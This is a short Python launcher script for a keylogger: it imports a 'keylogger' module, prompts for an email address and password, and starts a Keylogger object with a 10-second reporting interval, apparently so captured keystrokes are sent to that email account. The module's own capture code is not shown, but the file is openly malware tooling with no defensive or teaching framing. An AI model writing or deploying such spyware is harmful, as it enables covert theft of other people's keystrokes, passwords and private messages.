#!/usr/bin/env python

import keylogger

email = input("Please enter your email: ")
password = input("Please enter your password: ")
my_keylogger = keylogger.Keylogger(10, email, password)
my_keylogger.start()